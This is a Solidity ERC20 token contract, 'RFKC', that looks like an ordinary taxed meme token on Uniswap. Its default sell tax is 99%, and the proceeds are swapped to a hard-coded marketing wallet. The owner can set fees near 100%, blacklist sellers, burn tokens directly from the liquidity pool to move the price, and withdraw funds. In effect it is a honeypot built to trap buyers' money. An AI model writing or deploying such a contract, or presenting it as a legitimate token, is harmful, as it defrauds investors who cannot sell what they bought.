// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

interface IUniFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 inAmount,
        uint256 outAmountMin,
        address[] calldata route,
        address dest,
        uint256 endTimestamp
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniPair {
    function sync() external;
}

contract RFKC is ERC20, Ownable {
    uint256 public constant DENOMINATOR = 1e18;
    IUniRouter public constant router = IUniRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    address public immutable lpAddress;
    
    uint256 public purchaseTax = 0.02e18;
    uint256 public salesTax = 0.99e18;
    uint256 public burnTax = 0.01e18;

    bool private swapping;
    address public marketingAddr;
    uint256 public maxTxSize;
    uint256 public maxSwapImpact = 0.02e18;

    uint256 public reportCooldown = 72 * 1 hours;
    uint256 public prevReportTimestamp;
    mapping(address => bool) public feeExceptions;
    mapping(address => bool) public botsListed;

    event PollResult(uint256 pollPct, uint256 burnAmount, string rationale);

    constructor() ERC20("RFKC", "RFKC") {
        _mint(msg.sender, 10_000_000_000 * (10 ** decimals()));
        
        lpAddress = IUniFactory(router.factory()).createPair(address(this), router.WETH());
        _approve(address(this), address(router), type(uint256).max);

        setMarketingWallet(0xccaBB90a9AF85C271d2c08895A8196Ef8eE6C5de);

        feeExceptions[msg.sender] = true;
        feeExceptions[address(this)] = true;
        feeExceptions[address(router)] = true;
    }

    function setMarketingWallet(address _marketingWallet) public onlyOwner {
        marketingAddr = _marketingWallet;
        feeExceptions[marketingAddr] = true;
    }

    function updateFees(uint256 newPurchaseTax, uint256 newSalesTax, uint256 newBurnTax) public onlyOwner {
        require(newPurchaseTax < DENOMINATOR && newSalesTax < DENOMINATOR && newBurnTax < DENOMINATOR, "Invalid fee");
        purchaseTax = newPurchaseTax;
        salesTax = newSalesTax;
        burnTax = newBurnTax;
    }

    function setMaxTxSize(uint256 _maxSize) public onlyOwner {
        maxTxSize = _maxSize;
    }

    function setSwapImpact(uint256 _maxImpact) external onlyOwner {
        maxSwapImpact = _maxImpact;
    }

    function setReportCooldown(uint256 _cooldown) external onlyOwner {
        reportCooldown = _cooldown;
    }

    function exemptFromFees(address target) public onlyOwner {
        feeExceptions[target] = true;
    }

    function revokeFeeException(address target) external onlyOwner {
        feeExceptions[target] = false;
    }

    function addBots(address[] calldata botAddresses) external onlyOwner {
        for (uint256 i = 0; i < botAddresses.length; i++) {
            botsListed[botAddresses[i]] = true;
        }
    }

    function removeBots(address[] calldata botAddresses) external onlyOwner {
        for (uint256 i = 0; i < botAddresses.length; i++) {
            botsListed[botAddresses[i]] = false;
        }
    }

    function _transfer(address from, address to, uint256 quantity) internal override {
        if (swapping) {
            return super._transfer(from, to, quantity);
        }

        require(!botsListed[from], "Bot address");

        bool isBuy = from == lpAddress && !feeExceptions[to];
        bool isSell = to == lpAddress && !feeExceptions[from];

        if (isBuy || isSell) {
            require(maxTxSize > 0, "Trading not yet enabled");
            require(quantity <= maxTxSize, "Exceeds maximum transaction size");

            uint256 fees = calcTradeTax(from, quantity, isBuy);
            quantity -= fees;
        }

        super._transfer(from, to, quantity);
    }

    function calcTradeTax(address trader, uint256 qty, bool isBuy) private returns (uint256) {
        uint256 burnTaxQty = qty * burnTax / DENOMINATOR;
        super._transfer(trader, address(0xdead), burnTaxQty);

        uint256 tradeTax = (isBuy ? purchaseTax : salesTax) * qty / DENOMINATOR;
        super._transfer(trader, address(this), tradeTax);
        if (!isBuy) executeSwap();

        return tradeTax + burnTaxQty;
    }

    function executeSwap() private {
        uint256 balance = balanceOf(address(this));
        uint256 lpBalance = balanceOf(lpAddress);
        uint256 swapSize = lpBalance * maxSwapImpact / (2 * DENOMINATOR);
        if (balance > swapSize) balance = swapSize;
        if (balance == 0) return;

        swapping = true;

        address[] memory route = new address[](2);
        route[0] = address(this);
        route[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(balance, 0, route, marketingAddr, block.timestamp);

        swapping = false;
    }

    function releasePollScore(uint256 pollPct, uint256 increasePct, string calldata reason) external onlyOwner {
        require(increasePct < 0.3e18, "Invalid increase percentage");
        require(block.timestamp > prevReportTimestamp + reportCooldown, "Not yet allowed");

        prevReportTimestamp = block.timestamp;

        uint256 lpBalance = balanceOf(lpAddress);
        uint256 burnAmount = lpBalance * increasePct / (DENOMINATOR + increasePct);
        if (burnAmount > 0) {
            super._transfer(lpAddress, address(0xdead), burnAmount);
            IUniPair(lpAddress).sync();
        }

        emit PollResult(pollPct, burnAmount, reason);
    }

    function rescueTokens(address tokenAddr, uint256 tokenQty) external onlyOwner {
        IERC20(tokenAddr).transfer(owner(), tokenQty);
    }

    function withdrawETH(uint256 ethAmount) external onlyOwner {
        payable(owner()).transfer(ethAmount);
    }

    receive() external payable {}
}